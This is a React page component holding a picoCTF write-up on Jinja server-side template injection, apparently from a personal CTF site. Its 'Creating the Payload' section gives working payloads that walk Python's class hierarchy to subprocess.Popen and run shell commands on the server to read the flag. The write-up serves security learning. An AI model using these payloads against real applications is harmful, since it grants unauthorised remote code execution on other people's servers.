'use client';

import WriteupTemplate from '@/components/WriteupTemplate';

export default function SSTI1Writeup() {
  const writeupData = {
    title: 'Server-Side Template Injection (SSTI1)',
    category: 'Web Exploitation',
    points: '[000]',
    author: 'Kelvin',
    difficulty: 'hard' as const,
    tags: ['web', 'ssti1', 'python', 'jinja'],
    flag: 'picoCTF{...}',
    sections: [
      {
        title: 'Research',
        cards: [
          {
            title: 'What is SSTI?',
            items: [
              'Server-Side Template Injection occurs when an attacker can inject malicious input into a server-side template.',
              'A server-side template is a file used by a web application to generate dynamic content on the server (like the blueprint of the web app).',
            ],
          },
          {
            title: 'Common Server-Side Template Engines',
            items: [
              '<strong>Python:</strong> Jinja, Django',
              '<strong>PHP:</strong> Twig, Blade',
              '<strong>Java:</strong> FreeMarker, Thymeleaf',
              '<strong>Ruby:</strong> ERB',
              '<strong>Javascript:</strong> EJS',
            ],
          },
        ],
      },
      {
        title: 'Information Gathering',
        prose: 'Start by determining if the application evaluates template expressions from user input, and then identify the specific template engine in use.',
        steps: [
          {
            number: '01',
            label: 'Basic Quick Check',
            input: '{{7*7}}',
            output: '49',
            reason: '<strong>Reason:</strong> This confirms the vulnerability and rules out engines that do not use `{{...}}` syntax. It likely points to Jinja or Twig.',
          },
          {
            number: '02',
            label: 'Fingerprinting the Engine',
            input: "{{7*'7'}}",
            output: '7777777',
            reason: '<strong>Reason:</strong> If it were Twig, it would output 49. The output `7777777` confirms Python is evaluating the expression, meaning the engine is Jinja. Running `{{self.__class__}}` verifies this by outputting `<class \'jinja2.runtime.TemplateReference\'>` .',
          },
        ],
      },
      {
        title: 'Creating the Payload',
        prose: 'The goal is to escape the sandbox by traversing Python\'s Method Resolution Order (MRO) to find a class that allows executing OS commands.',
        steps: [
          {
            number: '01',
            label: 'Finding the Object Class',
            input: "{{''.__class__.__mro__[1]}}",
            output: "<class 'object'>",
            reason: '<strong>Reason:</strong> Starting with an empty string `\'\'`, we access its class `str`, then its MRO tuple, and grab the base `object` class at index 1.',
          },
          {
            number: '02',
            label: 'Listing Subclasses',
            input: "{{''.__class__.__mro__[1].__subclasses__()}}",
            output: '[... list of classes ...]',
            reason: '<strong>Reason:</strong> We display all classes that inherit from `object`. We are looking for classes in `os` or `subprocess` modules. We find `subprocess.Popen` at index 356.',
          },
          {
            number: '03',
            label: 'Remote Code Execution',
            input: "{{''.__class__.__mro__[1].__subclasses__()[356](['ls'], shell=True, stdout=-1).communicate()}}",
            output: "(b'__pycache__\\napp.py\\nflag\\nrequirements.txt\\n', None)",
            reason: '<strong>Reason:</strong> We instantiate `subprocess.Popen` to run the `ls` command. We see a file named `flag` in the output directory list.',
          },
          {
            number: '04',
            label: 'Extracting the Flag',
            input: "{{''.__class__.__mro__[1].__subclasses__()[356](['cat flag'], shell=True, stdout=-1).communicate()}}",
            output: '[Flag Content]',
            reason: '<strong>Reason:</strong> Running the `cat flag` command through the Popen shell allows us to read the flag and solve the puzzle.',
          },
        ],
      },
      {
        title: 'Key Takeaways',
        cards: [
          {
            title: '',
            items: [
              'Never pass unsanitized user input directly to a template engine\'s rendering context.',
              'Python\'s class inheritance hierarchy (`__mro__`, `__subclasses__`) allows powerful sandbox escapes if remote code execution is achieved.',
            ],
          },
        ],
      },
    ],
  };

  return <WriteupTemplate data={writeupData} />;
}
